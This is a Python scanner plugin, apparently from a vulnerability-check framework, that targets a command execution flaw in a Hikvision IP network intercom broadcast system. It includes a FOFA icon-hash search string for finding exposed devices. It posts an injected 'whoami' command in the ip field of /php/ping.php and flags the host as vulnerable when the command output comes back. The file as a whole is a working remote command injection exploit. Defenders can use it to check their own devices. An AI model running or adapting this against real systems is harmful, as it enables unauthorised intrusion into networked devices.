#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '海康威视IP网络对讲广播系统命令执行',

      'level'     :   'high',

      'FOFA'      :   'icon_hash="-1830859634"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/9',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      }
  target = '/php/ping.php'
  data = 'jsondata%5Btype%5D=99&jsondata%5Bip%5D=whoami'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,data=data,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'\[\".*?\\\\.*?\"\]',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret